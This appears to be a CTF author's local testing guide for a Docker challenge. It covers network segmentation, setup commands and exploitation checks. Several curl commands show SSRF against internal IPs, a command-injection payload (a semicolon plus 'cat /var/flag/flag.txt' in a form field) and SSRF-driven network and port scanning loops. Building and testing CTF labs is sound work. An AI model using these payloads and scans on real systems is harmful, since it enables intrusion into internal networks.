# Local Testing Guide with Custom IP Addresses

This guide explains how to test your CTF locally with different IP addresses for each service to simulate a more realistic network environment.

## Network Architecture

### IP Address Assignment
- **Nginx Proxy**: `192.168.100.10` (frontend) / `192.168.200.10` (backend)
- **Blog Service**: `192.168.100.20` (frontend) / `192.168.200.20` (backend)
- **Admin Service**: `192.168.200.30` (backend only)
- **Logs Service**: `192.168.200.40` (backend only)

### Network Segmentation
- **Frontend Network**: `192.168.100.0/24` - Public-facing services
- **Backend Network**: `192.168.200.0/24` - Internal services

## Quick Start

### 1. Start Testing Environment
```bash
# Use the testing configuration
docker-compose -f docker-compose-testing.yml up -d

# Check container IPs
docker network inspect ctf_govware_frontend
docker network inspect ctf_govware_backend
```

### 2. Access Points
- **Blog Website**: http://localhost:8081
- **Admin Panel**: http://localhost:8081/admin (via nginx proxy)
- **Logs Service**: http://localhost:8081/logs-service (via nginx proxy)

## Testing SSRF with Different IPs

### 1. Basic SSRF Test
```bash
# Test SSRF to admin service using IP address
curl "http://localhost:8081/fetch-next?url=http://192.168.200.30:80"

# Test SSRF to logs service using IP address
curl "http://localhost:8081/fetch-next?url=http://192.168.200.40:80"
```

### 2. Container Name Resolution
```bash
# Test SSRF using container names (should also work)
curl "http://localhost:8081/fetch-next?url=http://admin:80"
curl "http://localhost:8081/fetch-next?url=http://logs:80"
```

### 3. Network Scanning Simulation
```bash
# Test different IPs in the backend network
curl "http://localhost:8081/fetch-next?url=http://192.168.200.30:5001"
curl "http://localhost:8081/fetch-next?url=http://192.168.200.31:5001"  # Should fail
curl "http://localhost:8081/fetch-next?url=http://192.168.200.40:5002"
```

## Advanced Testing Scenarios

### 1. Command Injection via SSRF
```bash
# Chain SSRF with command injection using IP addresses
curl -X POST "http://localhost:8081/fetch-next?url=http://192.168.200.30:5001/logs" \
  -d "log_file=admin.log; cat /var/flag/flag.txt" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test with container name
curl -X POST "http://localhost:8081/fetch-next?url=http://admin:5001/logs" \
  -d "log_file=admin.log; ls -la /var/flag" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### 2. Network Discovery
```bash
# Simulate network discovery through SSRF
for ip in {30..40}; do
  echo "Testing 192.168.200.$ip"
  curl -s "http://localhost:8081/fetch-next?url=http://192.168.200.$ip:5001" | head -n 1
done
```

### 3. Port Scanning
```bash
# Test different ports on admin service
for port in 5000 5001 5002 8080; do
  echo "Testing port $port on admin service"
  curl -s "http://localhost:8081/fetch-next?url=http://192.168.200.30:$port" | head -n 1
done
```

## Debugging and Monitoring

### 1. Check Container Networks
```bash
# Inspect network configuration
docker network ls
docker network inspect ctf_govware_frontend
docker network inspect ctf_govware_backend

# Check container IPs
docker inspect ctf_govware-blog-1 | grep IPAddress
docker inspect ctf_govware-admin-1 | grep IPAddress
docker inspect ctf_govware-logs-1 | grep IPAddress
```

### 2. Container Logs
```bash
# Monitor logs in real-time
docker-compose -f docker-compose-testing.yml logs -f blog
docker-compose -f docker-compose-testing.yml logs -f admin
docker-compose -f docker-compose-testing.yml logs -f nginx
```

### 3. Network Connectivity Test
```bash
# Test connectivity between containers
docker exec ctf_govware-blog-1 ping 192.168.200.30
docker exec ctf_govware-blog-1 curl http://192.168.200.30:5001
```

## Security Testing Scenarios

### 1. Network Isolation Testing
- Verify that admin service is not directly accessible from outside
- Test that SSRF can bypass network restrictions
- Confirm that different networks are properly isolated

### 2. IP-based Access Control
- Test if services respond differently to requests from different IP ranges
- Verify that internal services only accept connections from expected sources

### 3. Service Discovery
- Use SSRF to discover internal services by IP scanning
- Test common internal service ports and endpoints

## Cleanup

```bash
# Stop and remove testing environment
docker-compose -f docker-compose-testing.yml down

# Remove custom networks
docker network prune
```

## Benefits of This Testing Setup

✅ **Realistic Network Environment**: Simulates real-world network segmentation
✅ **IP-based Testing**: Test SSRF with specific IP addresses
✅ **Network Discovery**: Practice network reconnaissance techniques
✅ **Isolation Testing**: Verify network security boundaries
✅ **Advanced Scenarios**: Test complex attack chains

## Notes

- Admin service remains accessible via SSRF to maintain challenge functionality
- Different IP ranges help simulate internal vs external network access
- This setup is ideal for testing and development before CTFd deployment
- All vulnerabilities (SSRF + Command Injection) remain functional

## Troubleshooting

**Issue**: Containers can't reach each other
**Solution**: Check network configuration and ensure containers are on correct networks

**Issue**: SSRF not working with IP addresses
**Solution**: Verify container IPs with `docker inspect` and test connectivity

**Issue**: Services not responding
**Solution**: Check if services are binding to `0.0.0.0` instead of `127.0.0.1`